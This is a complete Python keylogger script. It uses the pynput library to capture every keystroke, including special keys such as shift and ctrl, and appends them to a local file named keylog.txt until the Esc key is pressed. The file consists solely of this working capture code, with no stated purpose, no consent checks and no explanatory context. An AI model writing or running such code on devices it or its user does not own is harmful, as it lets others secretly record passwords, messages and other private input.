import pynput
from  pynput.keyboard  import Key, Listener

# Define the file to store the keystrokes
log_file = "keylog.txt"

def on_press(key):
    with open(log_file, "a") as log:
        try:
            log.write(f'{key.char}')
        except AttributeError:
            # Special keys (e.g., shift, ctrl, etc.) are handled here
            log.write(f'[{key}]')

def on_release(key):
    if key ==  Key.esc:
        # Stop listener when escape key is pressed
        return False
    
# Start listening to keystrokes
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()